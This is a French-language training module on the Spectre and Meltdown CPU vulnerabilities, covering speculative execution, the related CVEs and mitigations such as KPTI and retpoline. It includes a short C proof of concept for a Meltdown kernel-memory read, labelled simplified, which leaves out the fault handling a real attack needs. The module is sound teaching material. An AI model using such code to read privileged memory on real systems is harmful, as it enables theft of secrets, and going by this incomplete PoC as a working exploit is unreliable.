# Module A12 : Spectre & Meltdown - Exploitation spéculative

## Objectifs pédagogiques

- Comprendre l'exécution spéculative du CPU
- Exploiter Spectre v1/v2 et Meltdown
- Implémenter un PoC de lecture mémoire kernel
- Appliquer les mitigations

## Introduction

**Spectre** et **Meltdown** sont des vulnérabilités hardware dans les CPU modernes qui permettent de lire de la mémoire arbitraire via l'exécution spéculative.

```
┌────────────────────────────────────────────┐
│     Spectre vs Meltdown                    │
└────────────────────────────────────────────┘

Meltdown (CVE-2017-5754)
  ├─> Lit la mémoire kernel depuis userland
  ├─> Intel CPU affectés
  └─> Mitigation : KPTI (Kernel Page Table Isolation)

Spectre v1 (CVE-2017-5753)
  ├─> Bounds check bypass
  ├─> Tous les CPU
  └─> Mitigation : lfence, retpoline

Spectre v2 (CVE-2017-5715)
  ├─> Branch Target Injection
  ├─> Tous les CPU
  └─> Mitigation : IBRS, retpoline
```

## PoC Meltdown simplifié

```c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_LINE 64
char probe[256 * CACHE_LINE];

uint8_t read_kernel_byte(uint64_t kernel_addr) {
    // Flush probe array
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&probe[i * CACHE_LINE]);
    }
    
    // Exécution spéculative (non autorisée)
    uint8_t value = *(volatile uint8_t*)kernel_addr;
    
    // Encode dans le cache
    *(volatile char*)&probe[value * CACHE_LINE];
    
    // Mesurer quel index est en cache
    for (int i = 0; i < 256; i++) {
        uint64_t start = __rdtsc();
        *(volatile char*)&probe[i * CACHE_LINE];
        uint64_t end = __rdtsc();
        
        if (end - start < 100) {
            return i;  // Valeur leakée
        }
    }
    
    return 0;
}
```

## Résumé

- Spectre/Meltdown = vulnérabilités hardware CPU
- Exploite l'exécution spéculative + cache side-channel
- Permet de lire mémoire kernel/autres processus
- Mitigations : KPTI, retpoline, IBRS (impact perfs)

## Ressources

- **Paper original Spectre** : https://spectreattack.com/spectre.pdf
- **Paper original Meltdown** : https://meltdownattack.com/meltdown.pdf
- **PoC Meltdown** : https://github.com/IAIK/meltdown

---

**Module suivant** : [A13 - Rowhammer](../A13_rowhammer/)
